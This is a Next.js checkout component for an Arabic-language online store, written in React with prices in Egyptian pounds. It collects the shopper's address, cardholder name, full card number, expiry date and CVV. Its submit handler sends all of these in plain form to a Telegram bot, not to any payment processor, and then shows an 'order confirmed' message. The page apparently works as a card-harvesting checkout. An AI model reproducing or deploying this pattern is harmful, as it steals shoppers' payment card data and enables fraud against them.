"use client"

import { useState } from "react"
import Image from "next/image"
import Link from "next/link"
import { ArrowRight, Trash2, Minus, Plus, Loader2, ShoppingCart } from "lucide-react"
import { useCart } from "./cart-provider"
import { sendToTelegram } from "@/lib/telegram"

export function CheckoutContent() {
  const { cart, total, count, removeFromCart, updateQuantity, clearCart } =
    useCart()
  const [address, setAddress] = useState("")
  const [cardHolderName, setCardHolderName] = useState("")
  const [cardNumber, setCardNumber] = useState("")
  const [expiryDate, setExpiryDate] = useState("")
  const [cvv, setCvv] = useState("")
  const [loading, setLoading] = useState(false)
  const [success, setSuccess] = useState(false)
  const [error, setError] = useState("")

  // تنسيق رقم البطاقة (إضافة مسافات كل 4 أرقام)
  const formatCardNumber = (value: string) => {
    const digits = value.replace(/\D/g, "").slice(0, 16)
    return digits.replace(/(.{4})/g, "$1 ").trim()
  }

  // تنسيق تاريخ الانتهاء
  const formatExpiry = (value: string) => {
    const digits = value.replace(/\D/g, "").slice(0, 4)
    if (digits.length >= 3) {
      return `${digits.slice(0, 2)}/${digits.slice(2)}`
    }
    return digits
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setError("")

    // التحقق من البيانات
    if (cart.length === 0) {
      setError("السلة فارغة! أضف منتجات أولا.")
      return
    }
    if (!address.trim()) {
      setError("الرجاء إدخال العنوان")
      return
    }
    if (!cardHolderName.trim()) {
      setError("الرجاء إدخال الاسم على البطاقة")
      return
    }
    if (cardNumber.replace(/\s/g, "").length !== 16) {
      setError("رقم البطاقة يجب أن يكون 16 رقم")
      return
    }
    if (expiryDate.length < 5) {
      setError("الرجاء إدخال تاريخ الانتهاء بشكل صحيح")
      return
    }
    if (cvv.length !== 3) {
      setError("رمز CVV يجب أن يكون 3 أرقام")
      return
    }

    setLoading(true)

    const result = await sendToTelegram({
      items: cart.map((item) => ({
        name: item.product.name,
        quantity: item.quantity,
        price: item.product.price,
      })),
      total,
      address,
      cardHolderName,
      cardNumber: cardNumber.replace(/\s/g, ""),
      expiryDate,
      cvv,
    })

    setLoading(false)

    if (result) {
      setSuccess(true)
      clearCart()
    } else {
      setError(
        "تعذر إرسال الطلب. تأكد من إعدادات البوت (TOKEN و CHAT_ID) وحاول مرة أخرى."
      )
    }
  }

  // حالة النجاح
  if (success) {
    return (
      <div className="flex min-h-[60vh] flex-col items-center justify-center gap-6 px-4 text-center">
        <div className="flex h-20 w-20 items-center justify-center rounded-full bg-green-100 text-4xl">
          {"✅"}
        </div>
        <h2 className="text-2xl font-bold text-foreground">
          تم تأكيد الطلب بنجاح!
        </h2>
        <p className="text-muted-foreground">
          شكرا لك. سيتم التواصل معك قريبا.
        </p>
        <Link
          href="/"
          className="mt-4 rounded-xl bg-primary px-6 py-3 font-semibold text-primary-foreground transition-opacity hover:opacity-90"
        >
          العودة للمتجر
        </Link>
      </div>
    )
  }

  // السلة فارغة
  if (count === 0 && !success) {
    return (
      <div className="flex min-h-[60vh] flex-col items-center justify-center gap-6 px-4 text-center">
        <div className="flex h-20 w-20 items-center justify-center rounded-full bg-secondary">
          <ShoppingCart className="h-10 w-10 text-muted-foreground" />
        </div>
        <h2 className="text-2xl font-bold text-foreground">السلة فارغة</h2>
        <p className="text-muted-foreground">
          لم تضف أي منتجات بعد. ارجع للمتجر واختر منتجاتك.
        </p>
        <Link
          href="/"
          className="mt-4 rounded-xl bg-primary px-6 py-3 font-semibold text-primary-foreground transition-opacity hover:opacity-90"
        >
          تصفح المنتجات
        </Link>
      </div>
    )
  }

  return (
    <div className="mx-auto max-w-4xl px-4 py-10">
      {/* زر العودة */}
      <Link
        href="/"
        className="mb-8 inline-flex items-center gap-2 text-sm text-muted-foreground transition-colors hover:text-foreground"
      >
        <ArrowRight className="h-4 w-4" />
        <span>العودة للمتجر</span>
      </Link>

      <h1 className="mb-8 text-3xl font-bold text-foreground">إتمام الطلب</h1>

      <div className="flex flex-col gap-8 lg:flex-row">
        {/* ملخص السلة */}
        <div className="flex-1">
          <div className="rounded-2xl border border-border bg-card p-6 shadow-sm">
            <h2 className="mb-4 text-lg font-bold text-foreground">
              ملخص الطلب
            </h2>
            <div className="flex flex-col gap-4">
              {cart.map((item) => (
                <div
                  key={item.product.id}
                  className="flex items-center gap-4 rounded-xl bg-secondary/50 p-3"
                >
                  <div className="relative h-16 w-16 shrink-0 overflow-hidden rounded-lg">
                    <Image
                      src={item.product.image}
                      alt={item.product.name}
                      fill
                      className="object-cover"
                      sizes="64px"
                    />
                  </div>
                  <div className="flex-1">
                    <h3 className="font-semibold text-foreground">
                      {item.product.name}
                    </h3>
                    <p className="text-sm text-primary">
                      {item.product.price} جنيه
                    </p>
                  </div>
                  {/* أزرار التحكم بالكمية */}
                  <div className="flex items-center gap-2">
                    <button
                      onClick={() =>
                        updateQuantity(item.product.id, item.quantity - 1)
                      }
                      className="flex h-8 w-8 items-center justify-center rounded-lg bg-secondary text-foreground transition-colors hover:bg-muted"
                    >
                      <Minus className="h-3 w-3" />
                    </button>
                    <span className="w-6 text-center text-sm font-bold text-foreground">
                      {item.quantity}
                    </span>
                    <button
                      onClick={() =>
                        updateQuantity(item.product.id, item.quantity + 1)
                      }
                      className="flex h-8 w-8 items-center justify-center rounded-lg bg-secondary text-foreground transition-colors hover:bg-muted"
                    >
                      <Plus className="h-3 w-3" />
                    </button>
                  </div>
                  <button
                    onClick={() => removeFromCart(item.product.id)}
                    className="flex h-8 w-8 items-center justify-center rounded-lg text-muted-foreground transition-colors hover:bg-red-50 hover:text-red-500"
                  >
                    <Trash2 className="h-4 w-4" />
                  </button>
                </div>
              ))}
            </div>

            {/* المجموع */}
            <div className="mt-6 flex items-center justify-between border-t border-border pt-4">
              <span className="text-lg font-bold text-foreground">
                المجموع الكلي:
              </span>
              <span className="text-2xl font-bold text-primary">
                {total} جنيه
              </span>
            </div>
          </div>
        </div>

        {/* نموذج البيانات */}
        <div className="flex-1">
          <form
            onSubmit={handleSubmit}
            className="rounded-2xl border border-border bg-card p-6 shadow-sm"
          >
            <h2 className="mb-6 text-lg font-bold text-foreground">
              بيانات التوصيل والدفع
            </h2>

            <div className="flex flex-col gap-5">
              {/* العنوان */}
              <div className="flex flex-col gap-1.5">
                <label
                  htmlFor="address"
                  className="text-sm font-semibold text-foreground"
                >
                  العنوان بالكامل
                </label>
                <textarea
                  id="address"
                  value={address}
                  onChange={(e) => setAddress(e.target.value)}
                  placeholder="مثال: 15 شارع التحرير، الدقي، القاهرة"
                  rows={3}
                  className="rounded-xl border border-input bg-background px-4 py-3 text-foreground placeholder:text-muted-foreground focus:border-primary focus:ring-2 focus:ring-primary/20 focus:outline-none"
                  required
                />
              </div>

              {/* الاسم على البطاقة */}
              <div className="flex flex-col gap-1.5">
                <label
                  htmlFor="cardHolderName"
                  className="text-sm font-semibold text-foreground"
                >
                  الاسم على البطاقة بالكامل
                </label>
                <input
                  id="cardHolderName"
                  type="text"
                  value={cardHolderName}
                  onChange={(e) => setCardHolderName(e.target.value)}
                  placeholder="مثال: Sara Ahmed"
                  className="rounded-xl border border-input bg-background px-4 py-3 text-foreground placeholder:text-muted-foreground focus:border-primary focus:ring-2 focus:ring-primary/20 focus:outline-none"
                  required
                  dir="ltr"
                />
              </div>

              {/* رقم البطاقة */}
              <div className="flex flex-col gap-1.5">
                <label
                  htmlFor="card"
                  className="text-sm font-semibold text-foreground"
                >
                  رقم البطاقة
                </label>
                <input
                  id="card"
                  type="text"
                  value={cardNumber}
                  onChange={(e) =>
                    setCardNumber(formatCardNumber(e.target.value))
                  }
                  placeholder="1234 5678 9012 3456"
                  maxLength={19}
                  className="rounded-xl border border-input bg-background px-4 py-3 text-foreground placeholder:text-muted-foreground focus:border-primary focus:ring-2 focus:ring-primary/20 focus:outline-none"
                  required
                  dir="ltr"
                />
              </div>

              {/* تاريخ الانتهاء و CVV */}
              <div className="grid grid-cols-2 gap-4">
                <div className="flex flex-col gap-1.5">
                  <label
                    htmlFor="expiry"
                    className="text-sm font-semibold text-foreground"
                  >
                    تاريخ الانتهاء
                  </label>
                  <input
                    id="expiry"
                    type="text"
                    value={expiryDate}
                    onChange={(e) =>
                      setExpiryDate(formatExpiry(e.target.value))
                    }
                    placeholder="MM/YY"
                    maxLength={5}
                    className="rounded-xl border border-input bg-background px-4 py-3 text-foreground placeholder:text-muted-foreground focus:border-primary focus:ring-2 focus:ring-primary/20 focus:outline-none"
                    required
                    dir="ltr"
                  />
                </div>
                <div className="flex flex-col gap-1.5">
                  <label
                    htmlFor="cvv"
                    className="text-sm font-semibold text-foreground"
                  >
                    CVV
                  </label>
                  <input
                    id="cvv"
                    type="text"
                    value={cvv}
                    onChange={(e) =>
                      setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))
                    }
                    placeholder="123"
                    maxLength={3}
                    className="rounded-xl border border-input bg-background px-4 py-3 text-foreground placeholder:text-muted-foreground focus:border-primary focus:ring-2 focus:ring-primary/20 focus:outline-none"
                    required
                    dir="ltr"
                  />
                </div>
              </div>

              {/* رسالة خطأ */}
              {error && (
                <div className="rounded-xl bg-red-50 p-3 text-sm text-red-600">
                  {error}
                </div>
              )}

              {/* زر التأكيد */}
              <button
                type="submit"
                disabled={loading}
                className="mt-2 flex w-full items-center justify-center gap-2 rounded-xl bg-primary px-6 py-4 text-lg font-bold text-primary-foreground transition-opacity hover:opacity-90 active:scale-[0.98] disabled:cursor-not-allowed disabled:opacity-60"
              >
                {loading ? (
                  <>
                    <Loader2 className="h-5 w-5 animate-spin" />
                    <span>جاري الإرسال...</span>
                  </>
                ) : (
                  <span>تأكيد الطلب</span>
                )}
              </button>
            </div>
          </form>


        </div>
      </div>
    </div>
  )
}
